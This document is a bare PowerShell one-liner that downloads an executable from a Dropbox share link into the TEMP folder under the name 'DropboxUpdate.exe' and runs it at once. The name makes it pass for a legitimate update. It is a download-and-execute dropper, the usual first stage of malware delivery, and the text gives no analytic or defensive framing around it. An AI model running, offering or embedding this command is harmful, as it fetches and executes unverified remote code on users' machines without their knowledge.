
(New-Object System.Net.WebClient).DownloadFile('https://www.dropbox.com/s/gx6kxkfi7ky2j6f/Dropbox.exe?dl=1',"$env:TEMP\DropboxUpdate.exe");Start-Process ("$env:TEMP\DropboxUpdate.exe")

